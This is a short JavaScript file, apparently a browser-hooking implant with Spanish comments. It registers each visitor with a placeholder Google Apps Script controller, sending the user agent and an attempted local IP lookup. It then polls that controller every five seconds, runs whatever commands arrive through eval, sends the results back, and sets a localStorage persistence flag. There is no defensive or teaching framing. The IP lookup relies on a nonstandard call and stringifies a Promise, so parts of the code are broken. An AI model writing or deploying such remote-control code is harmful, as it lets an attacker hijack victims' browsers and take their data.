// hook.js
(function() {
  var SCRIPT_URL = "URL_DE_TU_GOOGLE_APPS_SCRIPT";
  var SESSION_ID = Math.random().toString(36).substring(2) + 
                   Math.random().toString(36).substring(2);
  var CHECK_INTERVAL = 5000; // 5 segundos
  
  // Inicializar sesión
  function initSession() {
    var xhr = new XMLHttpRequest();
    var url = SCRIPT_URL + "?action=init&sessionId=" + SESSION_ID + 
              "&ua=" + encodeURIComponent(navigator.userAgent) +
              "&ip=" + encodeURIComponent(JSON.stringify(getIPs()));
    
    xhr.open("GET", url, true);
    xhr.send();
  }
  
  // Obtener direcciones IP (aproximación)
  function getIPs() {
    return new Promise(function(resolve) {
      RTCPeerConnection.getLocalIPs(function(ips) {
        resolve(ips);
      });
    });
  }
  
  // Comprobar comandos
  function checkCommands() {
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
      if (xhr.readyState == 4 && xhr.status == 200) {
        var cmd = xhr.responseText;
        if (cmd && cmd !== "noop") {
          executeCommand(cmd);
        }
      }
    };
    
    xhr.open("GET", SCRIPT_URL + "?action=getcmd&sessionId=" + SESSION_ID, true);
    xhr.send();
  }
  
  // Ejecutar comando y enviar respuesta
  function executeCommand(cmd) {
    try {
      var result = eval(cmd);
      sendResponse(cmd, result);
    } catch(e) {
      sendResponse(cmd, "ERROR: " + e.message);
    }
  }
  
  function sendResponse(cmd, response) {
    var xhr = new XMLHttpRequest();
    var url = SCRIPT_URL + "?action=response&sessionId=" + SESSION_ID + 
              "&cmdId=" + encodeURIComponent(cmd) +
              "&response=" + encodeURIComponent(response);
    
    xhr.open("GET", url, true);
    xhr.send();
  }
  
  // Persistencia con localStorage
  if (!localStorage.getItem('_persist')) {
    localStorage.setItem('_persist', 'true');
    setInterval(checkCommands, CHECK_INTERVAL);
    initSession();
  }
  
  // Iniciar chequeo de comandos
  setInterval(checkCommands, CHECK_INTERVAL);
})();
